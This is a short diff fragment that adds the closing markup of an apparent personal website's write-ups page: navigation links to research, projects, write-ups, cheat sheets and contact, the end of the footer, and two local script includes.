+          ><a href="/research.html" data-section="research">Research</a
+          ><a href="/projects.html" data-section="projects">Projects</a
+          ><a href="/write-ups.html" data-section="writeups" class="active" aria-current="page"
+            >Write-ups</a
+          ><a href="/cheat-sheets.html" data-section="cheatsheets">Codex</a
+          ><a href="/index.html#contact" data-section="contact" class="nav-contact">Contact</a>
+        </nav>
+      </div>
+    </footer>
+    <script src="/navigation.js" defer></script>
+    <script src="/writeup.js" defer></script>
+  </body>
+</html>
